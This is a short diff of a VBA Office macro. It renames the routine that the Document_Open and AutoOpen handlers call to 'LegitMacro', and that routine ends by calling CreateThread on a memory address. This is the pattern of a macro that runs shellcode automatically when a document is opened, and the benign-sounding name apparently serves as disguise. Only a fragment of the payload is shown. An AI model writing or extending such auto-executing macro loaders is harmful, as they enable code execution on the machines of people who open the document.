@@ -60,8 +60,8 @@ Sub LegitMacro()
     res = CreateThread(0, 0, addr, 0, 0, 0)
 End Sub
 Sub Document_Open()
-    MyMacro
+    LegitMacro
 End Sub
 Sub AutoOpen()
-    MyMacro
+    LegitMacro
 End Sub
